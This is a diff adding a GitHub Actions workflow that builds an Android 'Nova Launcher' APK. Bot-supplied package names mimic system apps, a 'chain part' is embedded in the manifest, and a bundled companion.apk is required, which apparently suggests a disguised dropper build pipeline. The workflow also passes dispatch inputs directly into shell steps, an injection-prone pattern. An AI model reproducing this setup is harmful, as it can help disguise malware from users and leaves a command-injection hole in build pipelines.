@@ -1,0 +1,97 @@
+name: Build Nova Launcher APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+    inputs:
+      nova_package:
+        description: 'Nova package name (e.g. com.settings.abcd)'
+        required: false
+        default: ''
+      companion_package:
+        description: 'Companion package name (e.g. org.system.efgh)'
+        required: false
+        default: ''
+      chain_part1:
+        description: 'Chain Part 1 (10 chars, embedded in Nova manifest)'
+        required: false
+        default: ''
+
+jobs:
+  build:
+    name: Build Release APK
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Apply dynamic package names (if provided by bot)
+        run: |
+          NOVA_PKG="${{ github.event.inputs.nova_package }}"
+          COMPANION_PKG="${{ github.event.inputs.companion_package }}"
+          CHAIN_PART1="${{ github.event.inputs.chain_part1 }}"
+
+          # Only apply if bot supplied values
+          if [ -n "$NOVA_PKG" ]; then
+            echo "Applying Nova package: $NOVA_PKG"
+            sed -i "s/namespace 'com.example.nova'/namespace '$NOVA_PKG'/" app/build.gradle
+            sed -i "s/applicationId \"com.example.nova\"/applicationId \"$NOVA_PKG\"/" app/build.gradle
+          fi
+
+          if [ -n "$COMPANION_PKG" ]; then
+            echo "Applying Companion package: $COMPANION_PKG"
+            sed -i "s/\"com.android.pictach\"/\"$COMPANION_PKG\"/" app/build.gradle
+          fi
+
+          if [ -n "$CHAIN_PART1" ]; then
+            echo "Embedding chain part1: $CHAIN_PART1"
+            sed -i "s/android:value=\"PLACEHOLDER\"/android:value=\"$CHAIN_PART1\"/" app/src/main/AndroidManifest.xml
+          fi
+
+      - name: Verify companion.apk exists
+        run: |
+          if [ ! -f app/src/main/assets/companion.apk ]; then
+            echo "[X] companion.apk missing from assets!"
+            exit 1
+          fi
+          echo "[OK] companion.apk found ($(du -h app/src/main/assets/companion.apk | cut -f1))"
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Cache Gradle wrapper
+        uses: actions/cache@v4
+        with:
+          path: gradle/wrapper/gradle-wrapper.jar
+          key: gradle-wrapper-${{ runner.os }}
+
+      - name: Grant gradlew permission
+        run: chmod +x gradlew
+
+      - name: Build Release APK
+        run: ./gradlew assembleRelease --stacktrace --no-daemon
+
+      - name: Show APK info
+        run: |
+          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
+          echo "APK: $APK"
+          echo "Size: $(du -h $APK | cut -f1)"
+          echo "DEX files:"
+          unzip -l $APK | grep "\.dex"
+
+      - name: Upload Release APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: nova-launcher-release
+          path: app/build/outputs/apk/release/app-release.apk
+          retention-days: 1
+          overwrite: true
